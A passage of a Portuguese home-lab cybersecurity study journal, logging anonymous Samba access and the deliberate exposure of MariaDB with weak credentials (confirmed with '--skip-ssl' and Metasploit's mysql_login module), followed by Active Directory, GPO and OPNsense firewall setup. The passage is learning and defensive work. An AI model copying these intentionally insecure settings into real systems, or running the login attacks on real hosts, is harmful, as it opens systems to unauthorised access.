+8. **Nota de processo:** a primeira tentativa (colando várias linhas de comando de uma vez no prompt do `smbclient`) falhou de forma instrutiva — o `smbclient` engoliu as três linhas como um único comando local (`!`), fazendo com que `put` fosse interpretado pelo shell do Kali (que não o reconhece, `sh: 2: put: not found`) e o `ls` seguinte listasse a pasta pessoal do Kali em vez da partilha remota. Corrigido repetindo os comandos um de cada vez, com o prompt `smb: \>` a confirmar entre cada um.
+
+### Resultado
+Partilha Samba anónima e de escrita livre confirmada e funcional — o mesmo tipo de falha já visto no FTP (Entrada #59), agora replicado noutro protocolo largamente usado em redes empresariais.
+
+### Deduções e raciocínio
+Este exercício reforça uma lição importante: o padrão "acesso anónimo mal pensado" não é uma característica de um serviço específico — é um erro de configuração que se repete, com a mesma forma, em protocolos completamente diferentes (FTP, agora Samba, e potencialmente bases de dados a seguir). Reconhecer o padrão em vez de memorizar sintomas de um único serviço é o que realmente transfere para avaliar sistemas novos e desconhecidos no futuro. O incidente de processo (colar várias linhas no `smbclient`) também tem valor didático próprio: é um lembrete de que ferramentas interativas de linha de comandos (REPLs) nem sempre lidam bem com múltiplas linhas coladas de uma vez, e o comando `!` (execução local) pode "engolir" mais do que se pretende se não se validar o prompt entre comandos — uma disciplina útil para qualquer ferramenta interativa, não só o `smbclient`.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "configurei uma partilha de rede Samba para aceitar ligações anónimas com permissão de escrita, e a partir de outra máquina consegui listar essa partilha e enviar um ficheiro para lá, tudo sem fornecer qualquer utilizador ou password — o mesmo tipo de erro que já tinha visto no FTP, mas noutro protocolo."
+
+### Como nos podemos defender
+Nunca ativar `guest ok = yes` em partilhas Samba que não sejam mesmo destinadas a acesso público irrestrito; quando o acesso anónimo for mesmo necessário, restringir sempre a escrita (`read only = yes`); segmentar e limitar o acesso de rede às portas SMB (139/445) só a hosts que precisem mesmo de aceder à partilha; e auditar periodicamente a configuração de partilhas de rede, já que este tipo de erro tende a acontecer por conveniência temporária que depois nunca é revertida.
+
+### Domínios relacionados
+Security+ D2/D4 (Arquitetura e Operações — configuração segura de serviços de partilha de ficheiros), CEH D4 (Enumeração de serviços SMB), A+ Core 2 D2 (Segurança de rede).
+
+### Próximos passos
+Continuar a Fase 4 com o último serviço em falta do roteiro (uma base de dados com credenciais fracas), ou avançar para a Fase 5, conforme prioridade a decidir.
+
+---
+
+## Entrada #65 — Base de dados MariaDB exposta com credenciais fracas, confirmada manualmente e via Metasploit
+**Data/hora:** 2026-08-23
+**Máquinas ligadas:** Servidor Vulnerável, Kali
+
+### Objetivo / Propósito
+Fechar o terceiro e último serviço previsto no roteiro da Fase 4 ("FTP, Samba, bases de dados"): configurar uma base de dados com acesso remoto e credenciais fracas, um erro clássico de bases de dados deixadas "só para testes" e nunca corrigidas.
+
+### Ação executada
+1. Instalado o `mariadb-server` via `apt` (em vez do `mysql-server` da Oracle) — decisão documentada por três motivos: o repositório oficial do Ubuntu 24.04 já não distribui o MySQL diretamente, exigindo um repositório extra; o MariaDB é um substituto direto (*drop-in replacement*) do MySQL, com a mesma linguagem SQL e as mesmas ferramentas de administração e ataque (incluindo os módulos do Metasploit); e é o que se encontra hoje em dia na maioria dos servidores Linux reais.
+2. Confirmado que a configuração por defeito só aceitava ligações locais (`bind-address = 127.0.0.1`, em `/etc/mysql/mariadb.conf.d/50-server.cnf`).
+3. Alterado para `bind-address = 0.0.0.0` (aceita ligações de qualquer origem) via `sed`, e reiniciado o serviço.
+4. Criado um utilizador de teste com password fraca e acesso total, de qualquer origem: `CREATE USER 'dbadmin'@'%' IDENTIFIED BY 'admin123'; GRANT ALL PRIVILEGES ON *.* TO 'dbadmin'@'%';`.
+5. Confirmado com `ss -tlnp` que o MariaDB estava mesmo a escutar em `0.0.0.0:3306`.
+6. Primeira tentativa de ligação a partir do Kali (`mysql -h 192.168.10.101 -u dbadmin -padmin123`) falhou com `ERROR 2026: TLS/SSL error: SSL is required, but the server does not support it` — diagnosticado: o cliente `mysql` moderno exige TLS por defeito ao ligar a um host remoto, mas o servidor nunca teve TLS configurado (mais uma falha real desta configuração: dados e credenciais a viajarem sem cifra). Contornado com a flag `--skip-ssl`, replicando o que um atacante real faria.
+7. Ligação bem-sucedida confirmada manualmente — `SHOW DATABASES;` devolveu a lista completa sem qualquer restrição.
+8. Formalizado com Metasploit (`auxiliary/scanner/mysql/mysql_login`): uma primeira tentativa com listas completas de utilizadores/passwords revelou um problema da própria ferramenta — o módulo nunca chegou a testar `dbadmin` (ficou preso a testar `root` e `admin`, com vários "Unhandled error" causados por uma incompatibilidade da biblioteca Ruby do Metasploit com o protocolo de autenticação desta versão do MariaDB). Corrigido testando diretamente com `USERNAME dbadmin` e `PASSWORD admin123` — sucesso confirmado (`Success: 'dbadmin:admin123'`).
+
+### Resultado
+Base de dados MariaDB exposta remotamente, com credenciais fracas e sem cifra de ligação, confirmada como explorável tanto manualmente como via Metasploit.
+
+### Deduções e raciocínio
+Este exercício fecha o padrão que já se repetiu nos três serviços da Fase 4: o erro central nunca foi uma vulnerabilidade de código (como o Optionsbleed, que nem sequer se confirmou na prática), mas sim decisões de configuração — acesso anónimo, credenciais fracas, ausência de cifra — replicadas em protocolos completamente diferentes (FTP, Samba, agora SQL). O obstáculo do TLS foi uma boa lição extra: mostra como as ferramentas de cliente modernas às vezes já assumem segurança por defeito (exigir TLS), mas isso só protege quem usa essa ferramenta com essa exigência ativa — um servidor mal configurado, ou um atacante disposto a desativar essa proteção do seu próprio lado (`--skip-ssl`), continuam vulneráveis da mesma forma. Segurança do lado do cliente não compensa a falta de segurança do lado do servidor. O problema do Metasploit a "perder" utilizadores da lista também reforça uma lição já vista no Optionsbleed: as ferramentas de segurança têm os seus próprios bugs e limitações, e um resultado negativo ou incompleto de uma ferramenta não prova, por si só, que o alvo está seguro — só prova que aquela tentativa específica falhou.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "configurei uma base de dados para aceitar ligações de fora com um utilizador de password fraca, e depois de contornar uma exigência de cifra do lado do meu próprio cliente, consegui ligar-me e ver todas as bases de dados do servidor, sem qualquer autorização legítima — confirmei isto manualmente e depois com uma ferramenta formal de ataque, que teve as suas próprias limitações pelo caminho."
+
+### Como nos podemos defender
+Nunca expor uma base de dados diretamente à rede sem necessidade real (`bind-address = 127.0.0.1` deve ser o padrão, a menos que haja uma razão explícita para mudar); quando o acesso remoto for mesmo necessário, restringir por IP de origem específico em vez de `%` (qualquer origem), aplicar políticas de password fortes, e ativar TLS/SSL no próprio servidor para cifrar a ligação — não confiar só na exigência do lado do cliente. Firewalls de rede (segmentação, `ufw`) devem também limitar quem consegue sequer chegar à porta `3306`.
+
+### Domínios relacionados
+Security+ D2/D4 (Arquitetura e Operações — configuração segura de bases de dados, cifra em trânsito), CEH D4 (Enumeração de serviços de bases de dados), A+ Core 2 D2 (Segurança de rede).
+
+### Próximos passos
+**Fase 4 encerra aqui os três serviços previstos no roteiro** (FTP, Samba, base de dados), com um total de sete entradas produzidas nesta fase (#57–#65, contando a recuperação da VM e a descoberta da arquitetura de rede). Avançar para a Fase 5 (Windows Server, hardening, deteção — Wazuh) numa próxima sessão, ou continuar a aprofundar a Fase 4 com mais cenários, conforme prioridade a decidir.
+
+---
+
+## Entrada #66 — Início da Fase 5: recuperação de acesso e correção de rede do Windows Server
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** Windows Server, OPNsense
+
+### Objetivo / Propósito
+Arrancar a Fase 5 do roteiro (Active Directory, hardening, deteção com Wazuh), começando por confirmar que a VM Windows Server — sem uso há bastante tempo — estava acessível e corretamente ligada à rede do lab.
+
+### Ação executada
+1. Login inicial falhou por password incorreta — diagnosticado como um erro de maiúscula/minúscula na password guardada (não um esquecimento real da password). Resolvido corrigindo a capitalização ao escrever.
+2. Confirmado com `ipconfig` que a VM tinha um IP da rede de casa (`192.168.1.240`), não da rede isolada do lab (`192.168.10.0/24`), com uma tabela de rotas confusa (`Get-NetIPConfiguration` mostrou três gateways por defeito diferentes acumulados: `192.168.1.241`, `192.168.1.1`, `192.168.10.254`) e DNS a apontar para o router de casa.
+3. Verificado nas definições do VMware Workstation que o adaptador de rede já estava corretamente ligado ao LAN Segment "Ciber" (igual às outras VMs) — o problema não era de virtualização, era uma configuração de IP estática antiga dentro do próprio Windows, nunca limpa.
+4. Removida a configuração antiga (`Remove-NetIPAddress`, `Remove-NetRoute`) e atribuído um IP fixo dentro da rede do lab: `192.168.10.10/24`, gateway `192.168.10.254`, DNS `192.168.10.254` (temporário — vai passar a ser o próprio Windows Server, quando o Active Directory estiver instalado). Escolhido IP fixo (não DHCP) por ser o Controlador de Domínio previsto — precisa de um endereço estável para os clientes o encontrarem.
+5. Confirmado o resultado final com `ping 192.168.10.254` — sucesso, 0% de perda.
+
+### Resultado
+Windows Server acessível e corretamente ligado à rede isolada do lab, com IP fixo `192.168.10.10`, pronto para a instalação do Active Directory.
+
+### Deduções e raciocínio
+Este é já o terceiro caso, ao longo do projeto, de uma VM com configuração de rede desatualizada de uma utilização anterior a causar confusão (o Kali a cair na rede errada, o Ubuntu Desktop com uma reserva DHCP escondida, e agora o Windows Server com um IP estático de outra rede). O padrão comum: sempre que uma VM fica muito tempo sem uso, vale a pena verificar a configuração de rede do zero antes de assumir que "deve estar bem", em vez de gastar tempo a diagnosticar sintomas indiretos.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "a VM tinha ficado com um endereço IP de uma rede antiga (de casa), com resíduos de configurações manuais várias, por isso limpei tudo e atribuí um IP fixo novo dentro da rede do laboratório."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é gestão de infraestrutura. Lição transferível: documentar sempre a configuração de rede esperada de cada máquina (como já faz o roteiro) permite detetar rapidamente desvios, em vez de reconstruir o raciocínio do zero cada vez.
+
+### Domínios relacionados
+A+ Core 1 D2 (Redes — configuração de IP, gateway, DNS), Security+ D3 (Arquitetura de Segurança — gestão de configuração).
+
+### Próximos passos
+Instalar o Active Directory Domain Services no Windows Server e promover a Controlador de Domínio, dando início ao bloco de Active Directory da Fase 5.
+
+---
+
+## Entrada #67 — Instalação do Active Directory Domain Services e promoção do Windows Server a Controlador de Domínio (lab.local)
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** Windows Server
+
+### Objetivo / Propósito
+Instalar o papel (role) Active Directory Domain Services (AD DS) no Windows Server e promovê-lo a Controlador de Domínio, criando o domínio `lab.local` — o bloco central da Fase 5, depois de resolvida a rede na Entrada #66.
+
+### Ação executada
+1. Instalado o papel AD DS com `Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools`. Concluído com sucesso, sem necessidade de reiniciar nesta fase.
+2. Escolhido o nome de domínio `lab.local` — convenção comum para domínios de laboratório/teste, com o sufixo `.local` a evitar qualquer conflito com domínios reais da internet.
+3. Executado `Install-ADDSForest -DomainName "lab.local" -InstallDNS`, que promove o servidor a Controlador de Domínio de uma floresta (forest) nova e instala o serviço de DNS localmente (necessário para o funcionamento do AD).
+4. Definida interativamente a palavra-passe de Diretório de Restauro de Serviços (DSRM — Directory Services Restore Mode), uma palavra-passe separada de emergência usada apenas para recuperar o AD em modo de manutenção, não a palavra-passe normal de login.
+5. Confirmado o aviso de reinício ("The target server will be configured as a domain controller and restarted when this operation is complete") e aceite. A VM reiniciou automaticamente para concluir a promoção.
+6. Após o reinício, verificado o resultado com `Get-ADDomain` e `Get-NetIPConfiguration`.
+
+### Resultado
+`Get-ADDomain` confirmou a criação do domínio: `DNSRoot: lab.local`, `NetBIOSName: LAB` (o nome curto do domínio, usado em formatos como `LAB\Administrator`), `Forest: lab.local`, com o servidor `WIN-54OBK8B48L5.lab.local` (hostname gerado automaticamente) a deter todas as FSMO roles (PDC Emulator, RID Master, Infrastructure Master) — natural, por ser o único Controlador de Domínio existente.
+
+`Get-NetIPConfiguration` mostrou o DNS do próprio servidor agora a apontar para si mesmo (`::1` / `127.0.0.1`), em vez do OPNsense (`192.168.10.254`, usado temporariamente na Entrada #66).
+
+### Deduções e raciocínio
+O DNS a passar a apontar para o próprio servidor não é um resíduo mal corrigido — é o comportamento esperado e correto de um Controlador de Domínio instalado com `-InstallDNS`: o AD depende do seu próprio serviço de DNS para localizar controladores de domínio e outros serviços (via registos SRV), por isso o servidor tem de se usar a si mesmo como referência primária. Consequência prática a ter em conta: sem um forwarder configurado, este servidor deixa de conseguir resolver nomes fora do domínio (como a internet) — não bloqueia o que já foi feito, mas é o próximo ajuste lógico antes de avançar para OUs e utilizadores.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "instalei o papel de Active Directory e promovi o servidor a controlador de um domínio novo, chamado lab.local; agora ele gere a sua própria identidade de rede (DNS) em vez de depender do router."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Nota de segurança a reter para mais tarde: a palavra-passe de DSRM é uma credencial sensível (dá acesso de recuperação total ao AD) e deve ser tratada com o mesmo cuidado que uma palavra-passe de administrador, nunca partilhada ou registada em texto simples fora de um cofre de credenciais.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — Active Directory, serviços de diretório), CEH D3 (Reconhecimento de rede — AD como alvo comum), A+ Core 1 D2 (Redes — DNS, resolução de nomes).
+
+### Próximos passos
+Configurar um forwarder de DNS no Windows Server (a apontar para o OPNsense) para restaurar a resolução de nomes fora do domínio, e depois criar a estrutura inicial de OUs (Organizational Units) e uma conta de utilizador de teste.
+
+---
+
+## Entrada #68 — Confirmação do forwarder de DNS e criação da estrutura inicial de OUs e utilizador de teste no Active Directory
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** Windows Server
+
+### Objetivo / Propósito
+Fechar a resolução de nomes fora do domínio (deixada pendente na Entrada #67) e dar o primeiro passo prático dentro do Active Directory: criar uma estrutura organizacional de OUs e uma conta de utilizador de teste.
+
+### Ação executada
+1. Corrido `Add-DnsServerForwarder -IPAddress 192.168.10.254` — devolveu o aviso "already configured as forwarder", porque o DNS do servidor já apontava para o OPNsense antes da promoção a Controlador de Domínio (Entrada #66), e essa referência foi automaticamente importada como forwarder ao instalar o serviço de DNS local. Confirmado com `Get-DnsServerForwarder` e testado com `Resolve-DnsName google.com`, que devolveu IPs válidos (A e AAAA) sem erro — resolução de nomes internos e externos ambas a funcionar.
+2. Criada uma estrutura de OUs (Organizational Units) dedicada ao lab, em vez de usar os contentores por defeito do Windows (`Users`/`Computers`): uma OU de topo `Lab`, com três sub-OUs — `Utilizadores`, `Computadores`, `Servidores`.
+3. Criada uma conta de utilizador de teste (`New-ADUser`), com nome `Utilizador Teste` (SamAccountName `uteste`, UPN `uteste@lab.local`), dentro da OU `Utilizadores`, com password definida via `SecureString` e `-ChangePasswordAtLogon $true` (obriga a trocar a password no primeiro login).
+
+### Resultado
+`Get-ADOrganizationalUnit -Filter *` confirmou as quatro OUs esperadas (`Domain Controllers` — criada pelo Windows por defeito — mais `Lab`, `Utilizadores`, `Computadores`, `Servidores`, estas três aninhadas dentro de `Lab`). `Get-ADUser -Identity uteste` confirmou a conta criada, ativa (`Enabled: True`), no caminho correto (`CN=Utilizador Teste,OU=Utilizadores,OU=Lab,DC=lab,DC=local`).
+
+### Deduções e raciocínio
+Repetiu-se, pela segunda vez nesta fase, o hábito de colar um bloco de comandos duas vezes (já visto na Entrada #66, com os comandos de rede) — a primeira execução das quatro OUs teve sucesso silencioso (comportamento normal do PowerShell para estes cmdlets), e uma segunda colagem do mesmo bloco produziu erros "already in use", que na verdade confirmam indiretamente que a primeira execução funcionou. Não houve dano, mas vale a pena reforçar: quando um comando PowerShell não devolve nada, isso normalmente significa sucesso — mas em caso de dúvida, confirmar sempre com um comando de leitura (`Get-*`) em vez de assumir ou repetir o comando de escrita.
+
+A escolha de uma OU de topo dedicada (`Lab`) em vez dos contentores por defeito do Windows é uma prática comum em ambientes reais: mantém os objetos geridos separados dos objetos de sistema, e permite aplicar GPOs (políticas de grupo) a um subconjunto específico do domínio no futuro, sem afetar toda a floresta.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "criei pastas organizacionais (OUs) dentro do Active Directory para separar utilizadores, computadores e servidores, e depois criei uma conta de utilizador de teste dentro dessa estrutura, para começar a praticar a gestão de contas no domínio."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Lição transferível: a organização de OUs não é só estética — é a base sobre a qual assentam depois as políticas de segurança (GPOs) e a delegação de permissões administrativas; uma estrutura mal pensada logo no início complica a aplicação de políticas mais tarde.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — Active Directory, gestão de identidade), A+ Core 2 D1 (Sistemas Operativos — administração de utilizadores e permissões).
+
+### Próximos passos
+Definir a próxima etapa do bloco de Active Directory da Fase 5 — por exemplo, criar uma primeira Política de Grupo (GPO) simples e aplicá-la à OU `Utilizadores`, ou avançar para o hardening do OPNsense antes de voltar ao AD.
+
+---
+
+## Entrada #69 — Criação e ligação da primeira Política de Grupo (GPO) à OU Utilizadores
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** Windows Server
+
+### Objetivo / Propósito
+Dar o primeiro passo em Políticas de Grupo (GPOs) dentro do Active Directory: criar uma GPO simples e didática (aviso legal de login) e ligá-la à OU `Utilizadores`, preparando o terreno para, numa sessão futura, editar o seu conteúdo e testá-la com uma máquina cliente ligada ao domínio.
+
+### Ação executada
+1. Criada a GPO `Aviso-Login-Utilizadores` com `New-GPO`, pensada para mostrar uma mensagem de aviso legal antes do login — um requisito comum em normas de conformidade (ISO 27001, NIS2).
+2. Ligada essa GPO à OU `Utilizadores,OU=Lab,DC=lab,DC=local` com `New-GPLink`.
+3. Confirmado o resultado com `Get-GPO -Name "Aviso-Login-Utilizadores"` (GPO existe, `GpoStatus: AllSettingsEnabled`) e `Get-GPInheritance -Target "OU=Utilizadores,OU=Lab,DC=lab,DC=local"` (a GPO aparece em `GpoLinks`, junto com a `Default Domain Policy` herdada do domínio).
+
+### Resultado
+GPO criada e corretamente ligada à OU `Utilizadores`, ainda sem conteúdo definido (settings vazios — `AD Version: 0`). Fica pronta para edição numa sessão futura.
+
+### Deduções e raciocínio
+Repetiu-se pela terceira vez nesta fase o mesmo padrão de colar um bloco de comandos duas vezes (já visto nas Entradas #66 e #68) — a primeira execução de `New-GPO`/`New-GPLink` teve sucesso silencioso, e a segunda colagem produziu erros "already exists"/"already linked", que confirmam indiretamente o sucesso da primeira. Padrão agora bem estabelecido e já não motivo de preocupação, mas vale a pena, no futuro, colar os comandos um de cada vez para evitar a confusão inicial.
+
+Nota técnica importante para a continuação: editar o conteúdo de uma GPO (o texto do aviso propriamente dito) não tem, ao contrário dos passos anteriores desta fase, um equivalente prático em PowerShell — faz-se pela consola gráfica de Gestão de Políticas de Grupo (GPMC), que é a forma normal de o fazer mesmo em ambientes profissionais, não uma limitação deste lab. Além disso, para ver o efeito da GPO em ação, é necessário ter uma máquina cliente (ex.: Windows 11) já ligada ao domínio `lab.local` — isso ainda não foi feito, por isso ficou identificado como o passo seguinte antes de a GPO poder ser testada.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "criei uma Política de Grupo vazia e liguei-a à pasta de utilizadores do domínio; falta agora definir o que ela faz (o aviso de login) e ter um computador ligado ao domínio para conseguir ver o efeito."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Lição transferível: um aviso legal de login é uma medida de conformidade real e barata de implementar (não impede um ataque, mas estabelece formalmente que o acesso não autorizado é proibido, o que tem valor legal/processual em muitas normas).
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — Políticas de Grupo), ISO/IEC 27001 (A.5.10 — uso aceitável dos ativos), NIS2 (obrigações de governação e sensibilização).
+
+### Próximos passos
+Numa sessão futura: editar o conteúdo da GPO via GPMC (mensagem de aviso de login), juntar o Windows 11 ao domínio `lab.local`, e confirmar visualmente o aviso a aparecer no ecrã de login dessa máquina.
+
+---
+
+## Entrada #70 — Correção do âmbito da GPO (Utilizadores → Computadores) e definição do conteúdo do aviso de login via GPMC
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** Windows Server
+
+### Objetivo / Propósito
+Corrigir um erro de conceção identificado antes de perder trabalho, e completar o conteúdo da GPO criada na Entrada #69.
+
+### Ação executada
+1. Identificado que a definição pretendida ("Interactive logon: Message title/text") vive em `Computer Configuration`, ou seja, aplica-se a objetos do tipo computador — mas a GPO estava ligada à OU `Utilizadores`, que só contém contas de utilizador. Ligada a essa OU, a política nunca teria efeito nenhum, por não existir nenhum objeto computador a apanhá-la.
+2. Corrigida a ligação: `Remove-GPLink` da OU `Utilizadores`, seguido de `New-GPLink` para a OU `Computadores` (ambas dentro de `OU=Lab`). Desta vez os dois comandos foram corridos um de cada vez (não colados em bloco), e ambos devolveram output visível de sucesso — sem o efeito "silencioso" das vezes anteriores.
+3. Editado o conteúdo da GPO via GPMC (`gpmc.msc` → `Forest: lab.local` → `Domains` → `lab.local` → `Lab` → `Computadores` → botão direito na GPO → `Edit`): em `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options`, definidas as duas políticas `Interactive logon: Message title for users attempting to log on` (título: "Aviso Legal — Laboratório de Cibersegurança") e `Interactive logon: Message text for users attempting to log on` (texto de aviso legal de acesso não autorizado).
+4. Confirmado com `Get-GPO -Name "Aviso-Login-Utilizadores"` que o `ComputerVersion` passou de `AD Version: 0, SysVol Version: 0` para `AD Version: 10, SysVol Version: 10` — prova de que o conteúdo foi gravado (as políticas de GPMC não têm um botão "Guardar" explícito; a gravação é automática ao fechar cada caixa de diálogo com OK).
+
+### Resultado
+GPO `Aviso-Login-Utilizadores` corretamente ligada à OU `Computadores`, com conteúdo definido e confirmado. Falta apenas um computador membro do domínio, dentro dessa OU, para ver o efeito prático.
+
+### Deduções e raciocínio
+Esta foi uma correção proativa (identificada antes de gastar tempo a testar algo que nunca funcionaria) do tipo de erro conceptual mais comum em GPOs: confundir o âmbito de aplicação (a OU onde a GPO está ligada, que determina *que objetos* a recebem) com a secção da política (`Computer Configuration` vs. `User Configuration`, que determina *que tipo* de objeto a aplica). As duas têm de estar alinhadas — uma definição de computador ligada a uma OU só de utilizadores nunca produz efeito nenhum, e vice-versa. É um erro real e frequente mesmo em ambientes profissionais, não um exagero pedagógico deste lab.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "uma GPO só se aplica aos objetos do tipo certo (computador ou utilizador) que estejam dentro da OU a que está ligada; tinha ligado a uma OU de utilizadores uma definição que só se aplica a computadores, por isso mudei a ligação para a OU de computadores."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Lição transversal de auditoria de segurança: uma política de conformidade "existir" no papel (a GPO criada e com conteúdo) não significa que produza efeito — é preciso confirmar sempre o âmbito real de aplicação, não só a existência da regra.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — Políticas de Grupo, âmbito de aplicação), ISO/IEC 27001 (A.5.10 — uso aceitável dos ativos; A.8.9 — gestão de configuração).
+
+### Próximos passos
+Juntar o Windows 11 ao domínio `lab.local`, mover o seu objeto de computador para a OU `Computadores`, e confirmar visualmente o aviso de login a aparecer no ecrã dessa máquina.
+
+---
+
+## Entrada #71 — Windows 11 juntado ao domínio lab.local e aviso de login confirmado visualmente
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** Windows Server, Windows 11
+
+### Objetivo / Propósito
+Juntar o Windows 11 ao domínio `lab.local`, mover o seu objeto de computador para a OU `Computadores`, e confirmar visualmente que a GPO `Aviso-Login-Utilizadores` (Entradas #69-#70) produz efeito real — fechando o primeiro ciclo completo de GPO desta fase.
+
+### Ação executada
+1. No Windows 11, verificado com `ipconfig /all` que o IP estava correto (`192.168.10.100`, via DHCP) mas o DNS apontava para o OPNsense — corrigido com `Set-DnsClientServerAddress -InterfaceAlias "Ethernet 3" -ServerAddresses 192.168.10.10` e confirmado com `Resolve-DnsName lab.local`.
+2. Tentado o join ao domínio via `Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart` — a caixa de diálogo do `Get-Credential` do PowerShell revelou-se instável nesta VM (disparava, de forma repetida e mesmo sem colar nada, uma caixa "Selecionar uma aplicação para abrir 'Add-Computer'" fora de contexto, possivelmente por interferência do software de acesso remoto instalado na VM). Contornado usando o método clássico gráfico: `sysdm.cpl` → separador "Nome do computador" → `Alterar` → domínio `lab.local`, com sucesso.
+3. Autenticação (dois passos distintos): a sessão no Windows 11 foi iniciada com a conta local `pedro` (a habitual nesta VM); já as credenciais de administrador de domínio pedidas *durante o join* foram as da conta `administrator@lab.local`, escrita em formato UPN (`utilizador@dominio`) em vez de `DOMINIO\utilizador` — o formato UPN foi escolhido de propósito para evitar o problema de escrever `\` num teclado que não o estava a produzir corretamente.
+4. Confirmado o join com `Get-ComputerInfo | Select-Object CsDomain,CsPartOfDomain` → `lab.local` / `True`.
+5. No Windows Server, localizado o objeto de computador recém-criado (`Get-ADComputer`) — estava, como esperado, no contentor por defeito `CN=Computers`, não na OU `Computadores`. Movido com `Move-ADObject -Identity "CN=DESKTOP-78KHHRF,CN=Computers,DC=lab,DC=local" -TargetPath "OU=Computadores,OU=Lab,DC=lab,DC=local"`, confirmado com uma nova consulta `Get-ADComputer`.
+6. No Windows 11, forçada a atualização de política com `gpupdate /force` (em vez de esperar pelo ciclo automático de 90 minutos), seguida de `Restart-Computer`.
+7. Confirmado visualmente no ecrã de arranque: caixa preta com o título "Aviso Legal — Laboratório de Cibersegurança" e o texto definido, a bloquear o acesso ao ecrã de login até se clicar "OK".
+
+### Resultado
+Windows 11 corretamente juntado ao domínio, objeto de computador na OU certa, e GPO confirmada em produção — o ciclo completo "criar OU → criar GPO → definir conteúdo → aplicar a objeto certo → confirmar visualmente" ficou fechado com sucesso.
+
+### Deduções e raciocínio
+Dois problemas de processo (não de conceito) atrasaram este passo: o teclado da VM sem barra invertida a funcionar (contornado usando o formato UPN `utilizador@dominio` em vez de `DOMINIO\utilizador` — uma alternativa válida sempre disponível no Windows) e a instabilidade da caixa `Get-Credential` do PowerShell (contornada usando o caminho gráfico clássico `sysdm.cpl`, que é aliás a forma mais comum de fazer isto em ambientes reais, não uma solução de recurso inferior).
+
+A necessidade de mover manualmente o objeto de computador para a OU correta reforça a lição já registada na Entrada #70: uma GPO só produz efeito nos objetos que estão dentro do âmbito onde está ligada — não basta a GPO existir e ter conteúdo, os objetos-alvo têm de estar fisicamente (na estrutura do AD) no sítio certo.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "juntei o computador Windows 11 ao domínio, movi-o para a pasta certa dentro do Active Directory, e depois forcei a atualização da política para não ter de esperar; o resultado foi ver mesmo o aviso a aparecer no ecrã antes do login, confirmando que todo o processo funcionou de ponta a ponta."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Lição transversal: confirmar sempre o efeito final de uma política de segurança de forma visual/prática (não só pela existência da configuração) é a única forma de ter a certeza de que uma medida de conformidade realmente funciona.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — Active Directory, Políticas de Grupo), A+ Core 2 D1 (Sistemas Operativos — administração de domínio, DNS de cliente), ISO/IEC 27001 (A.5.10 — uso aceitável dos ativos, evidenciado em produção).
+
+### Próximos passos
+Continuar a Fase 5: hardening do OPNsense (regras de firewall) e/ou instalação do Wazuh (SIEM/HIDS) nas máquinas do lab.
+
+---
+
+## Entrada #72 — Hardening do OPNsense: egress filtering no "Servidor Vulneravel" (bloqueio de acesso à internet)
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** OPNsense, Servidor Vulneravel
+
+### Objetivo / Propósito
+Iniciar o bloco de hardening do OPNsense na Fase 5, com uma medida concreta e de baixo risco: impedir que a VM "Servidor Vulneravel" (a única intencionalmente insegura do lab) tenha acesso à internet, mantendo o acesso à rede interna necessário para os exercícios já feitos.
+
+### Ação executada
+1. Levantamento do estado inicial do firewall (`Firewall` → `Rules` → `LAN`): só existiam as duas regras automáticas do OPNsense ("Default allow LAN to any", IPv4 e IPv6) — ou seja, sem filtragem nenhuma dentro da rede "Ciber".
+2. Confirmado o IP atual do "Servidor Vulneravel" via `Services` → `ISC DHCPv4` → `Leases` (com "Show inactive" ativado, porque a VM estava desligada): `192.168.10.101`, MAC `00:0c:29:b4:8b:9c` — já existia uma reserva DHCP estática para este MAC, confirmando que o IP se mantém fixo.
+3. Criadas duas regras de firewall na interface LAN, pela ordem correta (a regra mais específica primeiro, já que o OPNsense avalia por "first match"): (a) `Pass`, origem `192.168.10.101`, destino `192.168.10.0/24` — permite tráfego para a rede do lab; (b) `Block`, origem `192.168.10.101`, destino `any` — bloqueia tudo o resto (a internet).
+4. **Primeira tentativa falhada**: depois de criar e reordenar as regras, o teste (`ping -c 3 8.8.8.8` a partir do Servidor Vulneravel) continuou a ter sucesso. Investigação em várias camadas:
+   - Confirmado com `ip route` que a VM tinha **duas rotas por defeito empatadas** (`metric 100` em ambas): uma via `ens33` (rede "Ciber", através do OPNsense) e outra via `ens37`, uma segunda interface de rede ligada à rede NAT do próprio VMware Workstation (`192.168.203.0/24`), historicamente usada na Fase 4 para dar acesso à internet durante instalações de pacotes (`apt install vsftpd`, `mariadb-server`, `apache2`). O Linux escolheu essa rota, contornando completamente o OPNsense. Corrigido removendo essa segunda placa de rede nas definições da VM (VMware Workstation → VM Settings → Hardware).
+   - Mesmo depois de corrigir a rota (só ficou `ens33`), o `ping` a `8.8.8.8` continuava a passar. Verificado `Firewall` → `Diagnostics` → `States` — sem estados antigos associados, descartando a hipótese de uma sessão antiga ainda ativa.
